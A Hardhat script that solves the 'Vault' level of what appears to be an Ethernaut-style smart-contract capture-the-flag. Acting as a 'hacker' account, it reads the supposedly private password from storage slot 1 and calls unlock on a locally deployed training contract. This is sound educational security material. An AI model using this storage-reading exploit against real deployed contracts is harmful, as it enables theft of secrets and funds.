import { ethers, getNamedAccounts } from 'hardhat';

import deployContract from '../deploy/08-vault';

const INSTANCE_CONTRACT_NAME = 'Vault';

async function main() {
  console.log(`Passing ${INSTANCE_CONTRACT_NAME} challenge...`);

  const { hacker: hackerAddress } = await getNamedAccounts();
  const hacker = await ethers.getSigner(hackerAddress);

  const contractAddress = await deployContract();
  const contractInstance = await ethers.getContractAt(INSTANCE_CONTRACT_NAME, contractAddress);
  const contract = contractInstance.connect(hacker);

  const isLocked = await contract.locked();
  console.log('Initial contract status: ', isLocked ? 'locked' : 'unlocked');

  const password = await ethers.provider.getStorage(contractAddress, '0x1');
  await contract.unlock(password);

  const isNowLocked = await contract.locked();
  console.log('New contract status: ', isNowLocked ? 'locked' : 'unlocked');

  console.log('Well done, You have completed this level!!!');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
